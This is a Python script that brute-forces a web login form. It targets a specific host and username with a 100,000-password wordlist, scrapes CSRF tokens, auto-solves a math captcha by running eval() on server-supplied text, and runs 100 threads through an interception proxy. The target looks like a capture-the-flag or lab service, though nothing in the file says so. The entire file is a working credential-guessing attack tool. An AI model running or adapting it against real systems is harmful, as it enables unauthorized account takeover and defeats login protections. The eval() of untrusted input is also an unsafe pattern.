import requests
import time
import os
import re
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from tqdm import tqdm

# --- CONFIGURATION ---
WORDLIST_PATH = "/usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-100000.txt"
BASE_URL = "http://34.100.175.35:30302"
USERNAME = "notatypicalsysadmin"
BATCH_SIZE = 100
DELAY = 30
THREADS = 100
LOG_FILE = "login_504.log"

# Proxy settings
USE_PROXY = True  # Set to True to enable
PROXIES = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}
# ---------------------

# Thread-safe global state
counter_lock = threading.Lock()
log_lock = threading.Lock()
attempt_counter = 0

def log_504(attempt_num, password):
    """Logs the 504 error with a timestamp in the requested format."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"{attempt_num}, {timestamp}, {password}\n"
    with log_lock:
        with open(LOG_FILE, "a") as f:
            f.write(log_entry)

def solve_captcha(session):
    """Fetches and solves the math captcha."""
    proxies = PROXIES if USE_PROXY else None
    try:
        resp = session.get(f"{BASE_URL}/captcha", timeout=15, proxies=proxies)
        if resp.status_code == 504:
            return "504_ERR"
        data = resp.json()
        return str(eval(data['question']))
    except Exception:
        return None

def attempt_login(password):
    global attempt_counter
    
    with counter_lock:
        attempt_counter += 1
        current_attempt = attempt_counter

    # Settings for proxies
    proxies = PROXIES if USE_PROXY else None

    # The HTML element that indicates we are STILL on the login page (Failure)
    LOGIN_BUTTON_HTML = '<input class="btn btn-primary" id="submit" name="submit" type="submit" value="Login">'
    LOGIN_FAIL_STRING = "Invalid username or password"

    with requests.Session() as s:
        try:
            # 1. Initial Page Load (to get CSRF)
            login_page = s.get(f"{BASE_URL}/login", timeout=15, proxies=proxies)
            if login_page.status_code == 504:
                log_504(current_attempt, password)
                return False

            csrf_match = re.search(r'name="csrf_token" value="(.*?)"', login_page.text)
            csrf_token = csrf_match.group(1) if csrf_match else ""

            # 2. Get/Solve Captcha
            captcha_result = solve_captcha(s)
            if captcha_result == "504_ERR":
                log_504(current_attempt, password)
                return False
            if not captcha_result:
                return False

            # 3. Post Credentials
            payload = {
                "csrf_token": csrf_token,
                "username": USERNAME,
                "password": password,
                "captcha": captcha_result,
                "submit": "Login"
            }
            
            response = s.post(f"{BASE_URL}/login", data=payload, allow_redirects=True, timeout=15, proxies=proxies)
            
            if response.status_code == 504:
                log_504(current_attempt, password)
                return False

            # SUCCESS LOGIC
            if LOGIN_BUTTON_HTML not in response.text and LOGIN_FAIL_STRING not in response.text:
                tqdm.write(f"\n[!] SUCCESS! Attempt #{current_attempt}: Found Password -> {password}")
                return True
            else:
                return False
                
        except Exception as e:
            if "timeout" in str(e).lower():
                log_504(current_attempt, password)
            return False

def start():
    if not os.path.exists(WORDLIST_PATH):
        print(f"[-] Error: {WORDLIST_PATH} not found.")
        return

    with open(WORDLIST_PATH, 'r', encoding='utf-8', errors='ignore') as f:
        passwords = [line.strip() for line in f if line.strip()]

    print(f"[*] Loaded {len(passwords)} passwords. Initializing...")
    if USE_PROXY:
        print(f"[*] Proxy is ENABLED: {PROXIES['http']}")

    found = False
    with tqdm(total=len(passwords), desc="Bruteforcing", unit="pw") as pbar:
        for i in range(0, len(passwords), BATCH_SIZE):
            batch = passwords[i:i + BATCH_SIZE]
            
            with ThreadPoolExecutor(max_workers=THREADS) as executor:
                results = list(executor.map(attempt_login, batch))
                
                pbar.update(len(batch))
                
                if any(results):
                    found = True
                    break

            if i + BATCH_SIZE < len(passwords):
                pbar.set_postfix_str(f"Cooldown: {DELAY}s")
                time.sleep(DELAY)
                pbar.set_postfix_str("Running")

    if not found:
        print("\n[!] Finished. No matches found.")

if __name__ == "__main__":
    start()